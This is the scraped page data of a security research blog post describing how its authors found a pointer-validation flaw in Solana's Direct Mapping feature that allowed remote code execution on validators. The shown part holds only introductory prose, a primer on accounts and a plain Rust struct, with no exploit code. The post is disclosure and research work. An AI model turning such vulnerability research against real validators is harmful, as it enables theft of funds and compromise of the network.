0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"blog\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"2025_06_27_pwning_solana_for_fun_and_profit\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L4\",null,[\"$\",\"$L5\",null,{\"children\":[\"$L6\",[\"$\",\"$L7\",null,{\"promise\":\"$@8\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$c\",null,{\"fallback\":null,\"children\":\"$Ld\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$e\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"f:I[7679,[\"894\",\"static/chunks/894-e85ac7d5aa9f4e1d.js\",\"250\",\"static/chunks/250-d31dac9ddbb4fbd7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2a522a9a319ee009.js\"],\"default\"]\n10:I[2619,[\"894\",\"static/chunks/894-e85ac7d5aa9f4e1d.js\",\"250\",\"static/chunks/250-d31dac9ddbb4fbd7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2a522a9a319ee009.js\"],\"*\"]\n"])</script><script>self.__next_f.push([1,"4:[[\"$\",\"$Lf\",null,{}],[\"$\",\"main\",null,{\"className\":\"relative isolate bg-[#050505] px-6 py-24 pt-32 sm:py-32 lg:px-8 min-h-screen\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute inset-0 bg-grid-pattern opacity-30 pointer-events-none\"}],[\"$\",\"div\",null,{\"className\":\"relative mx-auto max-w-4xl\",\"children\":[\"$\",\"article\",null,{\"className\":\"prose prose-invert prose-lg lg:prose-xl max-w-none\",\"children\":[[\"$\",\"div\",null,{\"className\":\"mb-12 pb-8 border-b border-white/10\",\"children\":[[\"$\",\"$L10\",null,{\"href\":\"/blog\",\"className\":\"inline-flex items-center gap-2 text-xs tracking-[0.2em] text-white/40 hover:text-white transition-colors mb-8 font-mono uppercase no-underline group\",\"children\":[[\"$\",\"span\",null,{\"className\":\"transition-transform group-hover:-translate-x-1\",\"children\":\"←\"}],\"BACK_TO_BLOG\"]}],[\"$\",\"div\",null,{\"className\":\"relative\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-4 -left-4 w-6 h-6 border-l-2 border-t-2 border-white/30\"}],[\"$\",\"div\",null,{\"className\":\"absolute -top-4 -right-4 w-6 h-6 border-r-2 border-t-2 border-white/30\"}],[\"$\",\"h1\",null,{\"className\":\"text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight text-white text-glow-strong leading-tight py-4\",\"children\":\"Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing\"}]]}],[\"$\",\"div\",null,{\"className\":\"mt-6 flex flex-wrap items-center gap-4 text-xs font-mono\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex items-center gap-2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"w-2 h-2 rounded-full bg-white animate-pulse\"}],[\"$\",\"span\",null,{\"className\":\"tracking-[0.2em] text-white/40 uppercase\",\"children\":\":: BLOG_POST\"}]]}],[\"$\",\"span\",null,{\"className\":\"text-white/20\",\"children\":\"|\"}],[\"$\",\"time\",null,{\"dateTime\":\"2025-06-27T00:00:00.000Z\",\"className\":\"tracking-[0.15em] text-white/60\",\"children\":[\"[\",\"2025.06.27\",\"]\"]}],[\"$\",\"span\",null,{\"className\":\"text-white/20\",\"children\":\"|\"}],[\"$\",\"span\",null,{\"className\":\"tracking-[0.15em] text-white/60 uppercase\",\"children\":[\"AUTHOR: \",\"anatomist\"]}]]}],[\"$\",\"div\",null,{\"className\":\"mt-8 border border-white/10 overflow-hidden\",\"children\":[\"$\",\"img\",null,{\"src\":\"/blog/solana_cover.png\",\"alt\":\"Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing\",\"className\":\"w-full h-auto object-cover\"}]}]]}],[\"$\",\"style\",null,{\"children\":\"\\n                @import url('https://fonts.googleapis.com/css2?family=Hind:wght@300;400;500;600;700\u0026display=swap');\\n\\n                .prose-content {\\n                  font-family: 'Hind', sans-serif;\\n                }\\n\\n                mjx-container[jax=\\\"SVG\\\"] \u003e svg {\\n                  display: inline !important;\\n                }\\n                mjx-container[display=\\\"true\\\"] {\\n                  padding: 0 4px;\\n                  border: 1px solid rgba(255, 255, 255, 0.2);\\n                  border-radius: 4px;\\n                }\\n              \"}],[\"$\",\"div\",null,{\"className\":\"prose-content\",\"children\":[[\"$\",\"h2\",\"h2-0\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"The Road to RCE\"}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"In this blog, we examine the Direct Mapping optimization first introduced in Solana version 1.16. Our research revealed a critical vulnerability caused by an oversight in pointer management, ultimately allowing us to achieve \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"full remote code execution (RCE) on a validator node\"}],\". This feature was never enabled on mainnet, but had this flaw gone unpatched, it could have compromised the entire Solana network—putting what is today \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"over $9 billion in total value locked (TVL)\"}],\" at risk.\"]}],\"\\n\",\"$L11\",\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\",\"\\n\",\"$L26\",\"\\n\",\"$L27\",\"\\n\",\"$L28\",\"\\n\",\"$L29\",\"\\n\",\"$L2a\",\"\\n\",\"$L2b\",\"\\n\",\"$L2c\",\"\\n\",\"$L2d\",\"\\n\",\"$L2e\",\"\\n\",\"$L2f\",\"\\n\",\"$L30\",\"\\n\",\"$L31\",\"\\n\",\"$L32\",\"\\n\",\"$L33\",\"\\n\",\"$L34\",\"\\n\",\"$L35\",\"\\n\",\"$L36\",\"\\n\",\"$L37\",\"\\n\",\"$L38\",\"\\n\",\"$L39\",\"\\n\",\"$L3a\",\"\\n\",\"$L3b\",\"\\n\",\"$L3c\",\"\\n\",\"$L3d\",\"\\n\",\"$L3e\",\"\\n\",\"$L3f\",\"\\n\",\"$L40\",\"\\n\",\"$L41\",\"\\n\",\"$L42\",\"\\n\",\"$L43\",\"\\n\",\"$L44\",\"\\n\",\"$L45\",\"\\n\",\"$L46\",\"\\n\",\"$L47\",\"\\n\",\"$L48\",\"\\n\",\"$L49\",\"\\n\",\"$L4a\",\"\\n\",\"$L4b\",\"\\n\",\"$L4c\",\"\\n\",\"$L4d\",\"\\n\",\"$L4e\",\"\\n\",\"$L4f\",\"\\n\",\"$L50\",\"\\n\",\"$L51\",\"\\n\",\"$L52\",\"\\n\",\"$L53\",\"\\n\",\"$L54\",\"\\n\",\"$L55\",\"\\n\",\"$L56\",\"\\n\",\"$L57\",\"\\n\",\"$L58\",\"\\n\",\"$L59\",\"\\n\",\"$L5a\",\"\\n\",\"$L5b\",\"\\n\",\"$L5c\",\"\\n\",\"$L5d\",\"\\n\",\"$L5e\",\"\\n\",\"$L5f\",\"\\n\",\"$L60\",\"\\n\",\"$L61\",\"\\n\",\"$L62\",\"\\n\",\"$L63\",\"\\n\",\"$L64\",\"\\n\",\"$L65\",\"\\n\",\"$L66\",\"\\n\",\"$L67\",\"\\n\",\"$L68\",\"\\n\",\"$L69\",\"\\n\",\"$L6a\",\"\\n\",\"$L6b\",\"\\n\",\"$L6c\",\"\\n\",\"$L6d\",\"\\n\",\"$L6e\",\"\\n\",\"$L6f\",\"\\n\",\"$L70\",\"\\n\",\"$L71\",\"\\n\",\"$L72\",\"\\n\",\"$L73\",\"\\n\",\"$L74\",\"\\n\",\"$L75\",\"\\n\",\"$L76\",\"\\n\",\"$L77\",\"\\n\",\"$L78\",\"\\n\",\"$L79\",\"\\n\",\"$L7a\",\"\\n\",\"$L7b\",\"\\n\",\"$L7c\",\"\\n\",\"$L7d\",\"\\n\",\"$L7e\",\"\\n\",\"$L7f\",\"\\n\",\"$L80\",\"\\n\",\"$L81\",\"\\n\",\"$L82\",\"\\n\",\"$L83\",\"\\n\",\"$L84\",\"\\n\",\"$L85\",\"\\n\",\"$L86\",\"\\n\",\"$L87\",\"\\n\",\"$L88\",\"\\n\",\"$L89\",\"\\n\",\"$L8a\",\"\\n\",\"$L8b\",\"\\n\",\"$L8c\",\"\\n\",\"$L8d\",\"\\n\",\"$L8e\",\"\\n\",\"$L8f\",\"\\n\",\"$L90\",\"\\n\",\"$L91\",\"\\n\",\"$L92\",\"\\n\",\"$L93\",\"\\n\",\"$L94\",\"\\n\",\"$L95\",\"\\n\",\"$L96\",\"\\n\",\"$L97\",\"\\n\",\"$L98\",\"\\n\",\"$L99\",\"\\n\",\"$L9a\",\"\\n\",\"$L9b\",\"\\n\",\"$L9c\",\"\\n\",\"$L9d\",\"\\n\",\"$L9e\",\"\\n\",\"$L9f\",\"\\n\",\"$La0\",\"\\n\",\"$La1\",\"\\n\",\"$La2\",\"\\n\",\"$La3\",\"\\n\",\"$La4\",\"\\n\",\"$La5\",\"\\n\",\"$La6\",\"\\n\",\"$La7\",\"\\n\",\"$La8\",\"\\n\",\"$La9\",\"\\n\",\"$Laa\",\"\\n\",\"$Lab\",\"\\n\",\"$Lac\",\"\\n\",\"$Lad\",\"\\n\",\"$Lae\",\"\\n\",\"$Laf\",\"\\n\",\"$Lb0\",\"\\n\",\"$Lb1\",\"\\n\",\"$Lb2\",\"\\n\",\"$Lb3\",\"\\n\",\"$Lb4\",\"\\n\",\"$Lb5\",\"\\n\",\"$Lb6\",\"\\n\",\"$Lb7\",\"\\n\",\"$Lb8\",\"\\n\",\"$Lb9\",\"\\n\",\"$Lba\",\"\\n\",\"$Lbb\",\"\\n\",\"$Lbc\",\"\\n\",\"$Lbd\",\"\\n\",\"$Lbe\",\"\\n\",\"$Lbf\",\"\\n\",\"$Lc0\",\"\\n\",\"$Lc1\",\"\\n\",\"$Lc2\",\"\\n\",\"$Lc3\",\"\\n\",\"$Lc4\",\"\\n\",\"$Lc5\",\"\\n\",\"$Lc6\",\"\\n\",\"$Lc7\",\"\\n\",\"$Lc8\",\"\\n\",\"$Lc9\",\"\\n\",\"$Lca\",\"\\n\",\"$Lcb\",\"\\n\",\"$Lcc\",\"\\n\",\"$Lcd\",\"\\n\",\"$Lce\",\"\\n\",\"$Lcf\",\"\\n\",\"$Ld0\",\"\\n\",\"$Ld1\",\"\\n\",\"$Ld2\",\"\\n\",\"$Ld3\",\"\\n\",\"$Ld4\",\"\\n\",\"$Ld5\",\"\\n\",\"$Ld6\",\"\\n\",\"$Ld7\",\"\\n\",\"$Ld8\",\"\\n\",\"$Ld9\",\"\\n\",\"$Lda\",\"\\n\",\"$Ldb\",\"\\n\",\"$Ldc\",\"\\n\",\"$Ldd\",\"\\n\",\"$Lde\",\"\\n\",\"$Ldf\",\"\\n\",\"$Le0\",\"\\n\",\"$Le1\",\"\\n\",\"$Le2\",\"$Le3\"]}],\"$Le4\"]}]}]]}],\"$Le5\"]\n"])</script><script>self.__next_f.push([1,"11df:I[7610,[\"894\",\"static/chunks/894-e85ac7d5aa9f4e1d.js\",\"250\",\"static/chunks/250-d31dac9ddbb4fbd7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2a522a9a319ee009.js\"],\"Footer\"]\n"])</script><script>self.__next_f.push([1,"11:[\"$\",\"p\",\"p-1\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"In addition to diving into vulnerability details, we want to also \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"demystify the bug-hunting process\"}],\" in this blog. As fascinating as it is to read about all the astonishing findings published by security researchers, rarely do we get a glimpse at the thought process behind. The path to discovering a critical bug is often marked by dead ends, intuition, curiosity, and deep system internals knowledge. By walking through our initial observations and narrowing down the actual vulnerability, we hope to shed light on what real-world vulnerability research looks like.\"]}]\n"])</script><script>self.__next_f.push([1,"12:[\"$\",\"p\",\"p-2\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Before we start, if you're primarily interested in the technical discussions, skip ahead to the \",[\"$\",\"a\",\"a-0\",{\"className\":\"text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"#Setting-the-Stage-A-Primer-on-Solanas-Execution-Environment\",\"children\":\"Setting the Stage: A Primer on Solana's Execution Environment\"}],\" section, where we discuss the background knowledge required to understand the bug. If you know your way around Solana internals and just want to read about the bug, you can jump directly to \",[\"$\",\"a\",\"a-1\",{\"className\":\"text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"#The-Vulnerability\",\"children\":\"The Vulnerability\"}],\" section. Otherwise, sit back and join us as we revisit this rollercoaster of a journey. :)\"]}]\n"])</script><script>self.__next_f.push([1,"13:[\"$\",\"h2\",\"h2-1\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"Very Long Story, Hopefully Short Enough\"}]\n14:[\"$\",\"p\",\"p-3\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Many blockchains have embraced modern programming languages like Rust and Go, which are often seen as safer alternatives to lower-level options like C or C++. While language choice is sometimes a matter of taste, it significantly shapes a protocol’s security profile. Solana uses Rust, a language renowned for memory safety and object lifetime management.\"}]\n15:[\"$\",\"p\",\"p-4\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"But of course, no software is impenetrable. Even before we discovered the RCE vulnerability, our dissection of Solana had already uncovered several validator mismatch bugs that could compromise the chain's liveness. These ranged from non-deterministic execution across multiple validators to misconfigurations in feature gating that led to unsynchronized upgrades. All of which indicate that \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Solana isn’t bulletproof\"}],\".\"]}]\n16:[\"$\",\"p\",\"p-5\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Most of the bugs we previously found leans more to the business logic side. After getting several of these, we are no longer satisfied with unveiling just another business logic bug. We want something deeper, something buried deep in Solana's system internals—\",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"the kind you uncover only through the most meticulous anatomy\"}],\".\"]}]\n17:[\"$\",\"p\",\"p-6\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"One target we set sight on is the removal of memory address translation, which seems"])</script><script>self.__next_f.push([1," like a powerful, but extremely dangerous optimization. Unfortunately, this feature never materialized.\"}]\n18:[\"$\",\"p\",\"p-7\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"While we're keeping watch of the address translation feature, we started exploring adjacent parts of the codebase. It wasn't long before we stumbled upon another interesting feature called Direct Mapping. And it was in this feature we discovered the kind of vulnerability we're looking for, one with the potential to \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"compromise the entire blockchain\"}],\".\"]}]\n19:[\"$\",\"p\",\"p-8\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"As you might already know, \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"every performance optimization carries the risk of introducing vulnerabilities\"}],\". The intuitive way to manage VM memory is to isolate it completely from the host running it. This ensures safety but sometimes introduces performance hits. Attempting to eliminate this isolation for speed, while still maintaining security, is ambitious and inherently \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"risky\"}],\".\"]}]\n"])</script><script>self.__next_f.push([1,"1a:[\"$\",\"p\",\"p-9\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Solana began developing the optimization starting with Direct Mapping, especially during Cross-Program Invocations (CPI), when programs must serialize and copy large amounts of account data, resulting in significant execution overhead. The new Direct Mapping mechanism introduced in Solana v1.16 aimed to eliminate unnecessary copying. Account data buffers are directly mapped into VM memory with the pointers dynamically updated rather than copying the entire data. However, this optimization required strict runtime validation of pointers during these dynamic updates, which was inadequately implemented and ultimately introduced the vulnerability.\"}]\n"])</script><script>self.__next_f.push([1,"1b:[\"$\",\"p\",\"p-10\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The vulnerability was powerful, but unfortunately, our exploit hit an unexpected wall thanks to an unrelated patch. After some hard work navigating the new limitations, we ultimately managed to craft a working exploit. Now, if you're ready, let's dive into the technical details.\"}]\n1c:[\"$\",\"h2\",\"h2-2\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"Setting the Stage: A Primer on Solana's Execution Environment\"}]\n1d:[\"$\",\"p\",\"p-11\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"To analyze the security of a system, we first need to understand how it works. Solana is heavily optimized for performance, more specifically, parallel execution of transactions, and requires extra care to prevent race conditions or non-determinism issues that may lead to liveness failures. This results in an object oriented design that incorporating Solana's unique data storage and transaction models.\"}]\n1e:[\"$\",\"h3\",\"h3-0\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"The Solana Account Model\"}]\n"])</script><script>self.__next_f.push([1,"1f:[\"$\",\"p\",\"p-12\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"In Solana, everything is stored in what are called \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Accounts\"}],\". You can think of the entire state of the Solana blockchain as a giant key-value store, where the \\\"key\\\" is an \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Address\"}],\" (a \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Pubkey\"}],\") and the \\\"value\\\" is the account data itself.\"]}]\n"])</script><script>self.__next_f.push([1,"20:[\"$\",\"p\",\"p-13\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"An \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Account\"}],\" holds several information, most importantly, it tracks the amount of native tokens an account has (\",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"lamports\"}],\"), the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"owner\"}],\" of the account, and an opaque \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"data\"}],\" field.\"]}]\n"])</script><script>self.__next_f.push([1,"21:[\"$\",\"pre\",\"pre-0\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Account\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" lamports\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Native token balance\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],\"$Le6\",\"$Le7\",\"$Le8\",\"$Le9\",\"$Lea\",\"$Leb\",\"$Lec\",\"$Led\",\"$Lee\",\"$Lef\",\"$Lf0\",\"$Lf1\",\"$Lf2\",\"$Lf3\",\"$Lf4\",\"$Lf5\",\"$Lf6\",\"$Lf7\",\"$Lf8\",\"$Lf9\",\"$Lfa\",\"$Lfb\",\"$Lfc\",\"$Lfd\",\"$Lfe\",\"$Lff\",\"$L100\",\"$L101\",\"$L102\",\"$L103\",\"$L104\",\"$L105\",\"$L106\",\"$L107\",\"$L108\",\"$L109\",\"$L10a\",\"$L10b\",\"$L10c\",\"$L10d\",\"$L10e\",\"$L10f\",\"$L110\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"22:[\"$\",\"p\",\"p-14\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"data\"}],\" field is where the magic happens. For a simple wallet account, this might be empty. But for an account owned by a program, this byte array holds all of its state. The structure of this data is defined by each program. This \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 